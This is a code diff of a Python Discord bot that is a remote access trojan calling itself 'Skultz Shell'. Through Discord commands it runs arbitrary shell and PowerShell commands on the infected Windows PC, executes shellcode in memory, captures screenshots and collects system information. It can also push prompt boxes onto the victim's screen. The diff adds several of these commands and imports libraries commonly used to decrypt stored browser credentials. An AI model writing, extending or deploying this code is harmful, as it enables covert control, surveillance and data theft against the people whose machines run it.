@@ -1,33 +1,47 @@
-import subprocess
 import pprint
-import sys
 import time
-from discord import message
 from Shell_Engine import *
-from discord.ext import commands
-import discord
 import base64
 import ctypes
 import getpass
-import os
-import platform
 import re
-import socket
 import subprocess
 import urllib.request
 import sys
-
+import string
+import random
+from discord import message
+import logging
+import GPUtil
+from tabulate import tabulate
+import cv2
+import discord
+from discord.ext import commands
+from discord import client
+import os
+import socket
+import platform
+import shutil
+import pyautogui
+import win32gui
+import json
+import base64
+import sqlite3
+import win32crypt
+from datetime import timezone, datetime, timedelta
+import psutil
+from subprocess import Popen, PIPE
+from datetime import datetime
+from threading import Thread
+import time
+from sys import argv
+import win32process
 
 bot = discord.Client()
 
 token = ''
 
-import string
-import discord
-import random
-from discord import message
-from discord.ext import commands
-import logging
+
 
 logger = logging.getLogger('discord')
 logger.setLevel(logging.DEBUG)
@@ -42,6 +56,13 @@ description = '''yes'''
 intents = discord.Intents.default()
 intents.members = True
 
+def get_size(bytes, suffix="B"):
+    factor = 1024
+    for unit in ["", "K", "M", "G", "T", "P"]:
+        if bytes < factor:
+            return f"{bytes:.2f}{unit}{suffix}"
+        bytes /= factor
+
 bot = commands.Bot(command_prefix='!', description=description, intents=intents)
 
 
@@ -54,14 +75,18 @@ async def on_ready():
 
 
 @bot.command()
-async def CMD(ctx, input: str):
+async def cmd(ctx, input: str):
     """executes commands on the pc"""
     comando = input
     b = subprocess.check_output(comando, shell=True)
     output = b.decode('cp1252')
     #if comando == "nslookup myip.opendns.com. resolver1.opendns.com":
-        #await ctx.send("nigga")
-    await ctx.send(output)
+        #await ctx.send("no")
+    #await ctx.send(output)
+    embed = discord.Embed(title='Console', description = '[!]: '+output, color = 0x680a0a)
+    embed.set_author(name='Skultz Shell', icon_url='https://cdn.discordapp.com/avatars/938965587110014996/e54cc8194cd33f576549fd75923fc642.png?size=1024')
+    embed.set_footer(text="Command executed by: {}".format(ctx.author.display_name))
+    await ctx.send(embed=embed)
 
 @bot.command()
 async def c(ctx):
@@ -73,7 +98,11 @@ async def c(ctx):
 async def sysm(ctx):
     """returns system information"""
     sysinfo = get_system_info()
-    await ctx.send(sysinfo)
+    #await ctx.send(sysinfo)
+    embed = discord.Embed(title='System information', description = '[!]: '+sysinfo, color = 0x680a0a)
+    embed.set_author(name='Skultz Shell', icon_url='https://cdn.discordapp.com/avatars/938965587110014996/e54cc8194cd33f576549fd75923fc642.png?size=1024')
+    embed.set_footer(text="Command executed by: {}".format(ctx.author.display_name))
+    await ctx.send(embed=embed)
 
 @bot.command()
 async def shell(ctx, msg: str):
@@ -107,5 +136,54 @@ async def shell(ctx, msg: str):
                                                    ctypes.c_int(-1))
 
         return "[*] Shellcode (%d bytes) executed in memory." % len(shellcode)
+
+pc_name = os.getenv("UserName")
+
+@bot.command()
+async def screenshot(ctx, pc=pc_name):
+    if pc == os.getenv("UserName"):
+        pyautogui.screenshot(f'C:\\Users\\{os.getenv("username")}\\s.png')
+        await ctx.send(file=discord.File(f'C:\\Users\\{os.getenv("username")}\\s.png'))
+        os.remove(f'C:\\Users\\{os.getenv("username")}\\s.png')
+
+@bot.command()
+async def battery(ctx, pc=pc_name):
+    if pc == os.getenv("UserName"):
+        battery = psutil.sensors_battery()
+        await ctx.send(f"Battery percentage : {battery.percent}\nPower plugged in : {battery.power_plugged}")
+
+def normal_info():
+    uname = platform.uname()
+    boot_time_timestamp = psutil.boot_time()
+    bt = datetime.fromtimestamp(boot_time_timestamp)
+    return f"""
+Computer Name: {os.getenv('username')}
+System: {uname.system}
+Node Name: {uname.node}
+Release: {uname.release}
+Version: {uname.version}
+Machine: {uname.machine}
+Processor: {uname.processor}
+Boot Time: {bt.year}/{bt.month}/{bt.day} {bt.hour}:{bt.minute}:{bt.second}\n"""
+
+@bot.command()
+async def info(ctx, pc=pc_name):
+    await ctx.send(f"```yaml\n{normal_info()}\n```")
+
+@bot.command()
+async def textbox(ctx, pc=pc_name, *, args):
+    if pc == os.getenv("UserName"):
+        cose = args.split(';')
+        x = pyautogui.prompt(text=cose[1], title=cose[0] , default='')
+        await ctx.send(f'response: `{x}`')
+
+@bot.command()
+async def cmd2(ctx, pc=pc_name, *, args):
+    if pc == os.getenv("UserName"):
+        os.system(f"powershell -c \"{args}\"")
+        comando = args
+        b  = subprocess.check_output(comando, shell=True)
+        output = b.decode('cp1252')
+        await ctx.send(output)
 
 bot.run(token)
